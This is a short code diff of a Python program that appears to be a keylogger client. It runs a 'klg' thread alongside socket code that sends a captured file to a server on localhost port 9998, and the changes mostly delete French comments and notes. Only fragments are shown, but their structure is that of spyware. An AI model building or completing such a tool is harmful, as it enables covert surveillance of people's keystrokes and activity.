@@ -6,17 +6,12 @@ import platform
 import pygetwindow as gw
 import socket
 import time
-import sys #sys.exit()
+import sys
 
 host, port = ("localhost", 9998)
-today = datetime.now()
+today = datetime.now()   
 
-def closeKlg():
-    time.sleep(600)
-
-#def srvStatus():    
-
-def socketConnection(host, port, today): #faire une fonction qui fait s'écouler 10min, au bout de ces dix minutes le programme s'arrete
+def socketConnection(host, port, today):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
@@ -53,11 +48,6 @@ def sendFile(client,today):
             print(f"Erreur de socket : {e}")
             break
     client.close()
-    #client.close()
-    #return true    
-    #except
-    #return false
-    #si sendFile renvoit false et que srvStatus renvoie vrai = le serveur n'est pas joignable alors fin
 
 def bServerShutdown(client):
     while True:
@@ -135,8 +125,3 @@ if __name__ == '__main__' :
 
     klg.join()
     srv_skt.join()
-
-"""
-Comment gérer la reception de la string ? Process ?
-Il faut que le programme continue de tourner et en même temps qu'il check constament si il string est envoyé ou pas
-"""
